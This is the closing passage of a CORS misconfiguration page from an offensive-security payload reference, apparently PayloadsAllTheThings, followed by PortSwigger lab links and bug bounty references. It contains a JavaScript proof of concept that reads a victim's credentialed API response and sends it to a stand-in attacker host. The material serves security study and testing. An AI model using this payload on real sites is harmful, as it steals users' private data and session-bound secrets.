<!-- source: CORS Misconfiguration/README.md | chunk 3/3 | MIT — Copyright (c) 2019 Swissky (PayloadsAllTheThings) -->

This PoC requires the respective JS script to be hosted at `apiiexample.com`

```js
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://api.example.com/endpoint',true); 
req.withCredentials = true;
req.send();

function reqListener() {
    location='//attacker.net/log?key='+this.responseText; 
};
```

## Labs

* [PortSwigger - CORS vulnerability with basic origin reflection](https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack)
* [PortSwigger - CORS vulnerability with trusted null origin](https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack)
* [PortSwigger - CORS vulnerability with trusted insecure protocols](https://portswigger.net/web-security/cors/lab-breaking-https-attack)
* [PortSwigger - CORS vulnerability with internal network pivot attack](https://portswigger.net/web-security/cors/lab-internal-network-pivot-attack)

## References

* [[██████] Cross-origin resource sharing misconfiguration (CORS) - Vadim (jarvis7) - December 20, 2018](https://hackerone.com/reports/470298)
* [Advanced CORS Exploitation Techniques - Corben Leo - June 16, 2018](https://web.archive.org/web/20190516052453/https://www.corben.io/advanced-cors-techniques/)
* [CORS misconfig | Account Takeover - Rohan (nahoragg) - October 20, 2018](https://web.archive.org/web/20250426222841/https://hackerone.com/reports/426147)
* [CORS Misconfiguration leading to Private Information Disclosure - sandh0t (sandh0t) - October 29, 2018](https://web.archive.org/web/20190820201328/https://hackerone.com/reports/430249)
* [CORS Misconfiguration on www.zomato.com - James Kettle (albinowax) - September 15, 2016](https://web.archive.org/web/20171230084544/https://hackerone.com/reports/168574)
* [CORS Misconfigurations Explained - Detectify Blog - April 26, 2018](https://web.archive.org/web/20230323053559/https://blog.detectify.com/2018/04/26/cors-misconfigurations-explained/)
* [Cross-origin resource sharing (CORS) - PortSwigger Web Security Academy - December 30, 2019](https://web.archive.org/web/20260302141111/https://portswigger.net/web-security/cors)
* [Cross-origin resource sharing misconfig | steal user information - bughunterboy (bughunterboy) - June 1, 2017](https://web.archive.org/web/20250512191501/https://hackerone.com/reports/235200)
* [Exploiting CORS misconfigurations for Bitcoins and bounties - James Kettle - October 14, 2016](https://web.archive.org/web/20190919034024/https://portswigger.net/blog/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)
* [Exploiting Misconfigured CORS (Cross Origin Resource Sharing) - Geekboy - December 16, 2016](https://web.archive.org/web/20260204152901/https://www.geekboy.ninja/blog/exploiting-misconfigured-cors-cross-origin-resource-sharing/)
* [Think Outside the Scope: Advanced CORS Exploitation Techniques - Ayoub Safa (Sandh0t) - May 14, 2019](https://web.archive.org/web/20210126182728/https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397)
